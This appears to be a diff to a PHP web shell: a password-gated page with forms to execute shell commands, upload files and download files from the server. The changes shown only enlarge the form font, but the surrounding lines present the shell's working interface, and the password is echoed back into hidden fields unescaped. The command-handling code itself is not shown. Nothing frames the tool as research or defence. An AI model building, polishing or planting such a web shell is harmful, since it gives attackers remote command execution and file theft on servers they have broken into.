@@ -40,7 +40,7 @@ if (isset($_POST['password']) && $_POST['password'] === $password) {
     
 } else {
     // If password is incorrect or not entered, show login form
-    echo '<form method="POST">
+    echo '<form method="POST" style="font-size: 20px;">
             <input type="password" name="password" placeholder="Password">
             <input type="submit" value="Login">
           </form>';
@@ -53,21 +53,21 @@ if (isset($_POST['password']) && $_POST['password'] !== $password) {
 ?>
 
 <!-- Command execution form -->
-<form method="POST">
+<form method="POST" style="font-size: 20px;">
     <input type="hidden" name="password" value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>">
     <input type="text" name="cmd" placeholder="Enter command">
     <input type="submit" value="Execute">
 </form>
 
 <!-- File upload form -->
-<form method="POST" enctype="multipart/form-data">
+<form method="POST" enctype="multipart/form-data" style="font-size: 20px;">
     <input type="hidden" name="password" value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>">
     <input type="file" name="file">
     <input type="submit" value="Upload File">
 </form>
 
 <!-- File download form -->
-<form method="POST">
+<form method="POST" style="font-size: 20px;">
     <input type="hidden" name="password" value="<?php echo isset($_POST['password']) ? $_POST['password'] : ''; ?>">
     <input type="text" name="download" placeholder="File to download">
     <input type="submit" value="Download">
